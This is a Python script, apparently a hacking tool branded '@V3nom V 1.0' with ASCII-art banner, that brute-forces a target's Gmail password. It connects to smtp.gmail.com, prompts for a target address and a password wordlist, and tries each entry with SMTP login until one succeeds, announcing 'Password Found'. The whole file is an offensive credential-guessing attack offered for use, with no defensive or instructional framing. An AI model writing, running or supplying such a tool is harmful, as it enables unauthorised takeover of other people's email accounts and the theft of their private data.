
import smtplib, sys, os, random
from os import system

OKGREEN = '\033[92m'
WARNING = '\033[0;33m'
FAIL = '\033[91m'
ENDC = '\033[0m'
LITBU = '\033[94m'
YELLOW = '\033[3;33m'
CYAN = '\033[0;36'
colors = ['\033[92m', '\033[91m', '\033[0;33m']
RAND = random.choice(colors)

GMAIL_PORT = '587'

def artwork():
    print("\n")
    print(RAND + '''
                                                       ``         
                                                       ``                               +sy-        
                                                    -odNmhdhs+/-.                       `yo         
                                                `/ymMMMMMMMMMMMMNmy/.````````````````````o:         
                                               sNMMMMMMMMMMMMMMMMMMMNNh+//////////////////`         
                                               sNMMMMMMMMMMMMMMMMMMMMMMNy:                          
          `:/-   ::  ./`    -/  `/- -/  -/:`  :/++shddmMMNdyyhNMMMMMMMMMMNy`                        
         `mh/s/ :NN- +M-   `mNo .MN+yN ym/sy`hm/dd  ```-:.`   `/dMMMMMMMMMMm-       ``/-y`/`        
         .Mo ...mddm`+M-   yNyM:.MhmNN dd-hN.mh sM`             `+NMMMMMMMMMm.      dhNNhh:         
                                             /hyho    /oooh++     oMMMMMMMMMMm.     oMMMMs/`        
          ..`..```.```.--.`-` .-`..... ..-.   ```      :yMMMy   `omMMMMMMMMMMMm/    :MNo/.`         
          --`.- `-.  .-``` ---.  --..``-..-.           :+hhmMo``oMMMMMMMMMMMMMMMdsohNm-             
          --`--`--.-`-- `` ----` --.. `-.--                `+NmmMN+oMMMMMMMMMMMhymMMd.              
          .. .. ``.. `...` -` .. ....` -``-`                 -ydy- /MMMMMMMMMMM/ `.-`               
          :sso--y.  `y/ os`ysss- syss:     o/ `                `  `dMMMMMMMMMMM.                    
         `Ny./-/M:  .Mo dm`MdsMs Nmoo`     .h`h.:                `yMMMMMMMMMMMh                     
         `Ny./-/M/..`Ny.md`Mh+Ny Nd++`      -hNyNh. `-//`       -dMMMMMMMMMMMN-                     
         `+soo.-ysoo :ooo.`ysos- ssso:     +odMMMm.+dNMMs     -sNMMMMMMMMMMMN:                      
         y+y////////////////////////////////ydNMMNmMmsMMN---+hNMMMMMMMMMMMMh-                       
         -:-``````````````````````````````````-+yys/``NMMNNNMMMMMMMMMMMMMd/`                        
                                                  `.:sNMMMMMMMMMMMMMMMmy:`                          
                                               .:sdNMMMMMMMMMMMMMMMmy/.                             
                                            `/ymMMMMMMMMMMMMMMNmho:....`...`...`... ...             
                                          .omMMMMMMMMMNNMMMMMN+`   ://+o-y-+-:-o/y/o/+::            
                                        `oNMMMMMMNmy+:-.+dMMMMm.   `:/:.:/--::/.:/:.-/:`            
                                       -dMMMMMMms-`      `/hmMMd`  :+/s+o++so+s+ooo:                
                                      -NMMMMMm+`         `:+dMNh`  :s/s+soyy+ssooooo/-/`            
                                     `mMMMMMy.          `dMNho-    :+/sos:s+s/+ss/oos+o-            
                                     /MMMMMo            oMMmo:-`   ./+:-//:-/+:-/::.:-:.            
                                     yMMMMs             dMMMMms.   :++/o:o/++s/+/y++::-:            
                                     dMMMM`             hhyMdy+`    ..` ..` `.` `.` `.`             
                                     mMMMN              -+`yh:o                                     
                                     dMMMN`                `os                                      
                                     +MMMM:                  `                                      
                                     `dMMMd`                                                        
                                      .dMMMd-                                                       
                                       `sMMMN+`                                                     
                                         -hNMMms:`                                                  
                                           .omMMMmyo/.``                                            
                                              .+ymNMMMNNmdhyhy+osys.                                
                                                  `-:+ossyyysso/:.                                  
                                                                           @V3nom V 1.0

''')
artwork()
smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)

smtp.ehlo()
smtp.starttls()

user = input("Target Gmail Addres >>> ")
pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")

if pwd=='0':
    passswfile="passworld.txt"

elif pwd=='1':
    print("\n")
    passswfile = input("Name The File Path (Password  List) => ")

else:
    print("\n")
    print("Invalid input! Terminaling...")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtp.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Pasword Is Wrong. %s " % password)
